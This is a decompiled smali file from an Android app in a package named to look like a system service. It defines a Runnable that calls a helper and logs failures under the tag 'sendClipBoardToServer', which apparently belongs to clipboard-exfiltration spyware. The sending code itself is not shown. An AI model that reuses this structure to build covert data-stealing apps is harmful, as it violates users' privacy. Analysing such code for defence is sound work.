.class final Lcom/systemservice/a/c/d/a;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/d/b;->a(Landroid/content/Context;Ljava/util/List;)I
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# instance fields
.field final synthetic a:[I

.field final synthetic b:Landroid/content/Context;

.field final synthetic c:Ljava/util/List;


# direct methods
.method constructor <init>([ILandroid/content/Context;Ljava/util/List;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/d/a;->a:[I

    iput-object p2, p0, Lcom/systemservice/a/c/d/a;->b:Landroid/content/Context;

    iput-object p3, p0, Lcom/systemservice/a/c/d/a;->c:Ljava/util/List;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    const/4 v0, 0x0

    :try_start_0
    iget-object v1, p0, Lcom/systemservice/a/c/d/a;->a:[I

    iget-object v2, p0, Lcom/systemservice/a/c/d/a;->b:Landroid/content/Context;

    iget-object v3, p0, Lcom/systemservice/a/c/d/a;->c:Ljava/util/List;

    invoke-static {v2, v3}, Lcom/systemservice/a/c/d/c;->a(Landroid/content/Context;Ljava/util/List;)I

    move-result v2

    aput v2, v1, v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    iget-object v2, p0, Lcom/systemservice/a/c/d/a;->a:[I

    aput v0, v2, v0

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    const-string v1, "sendClipBoardToServer"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    return-void
.end method
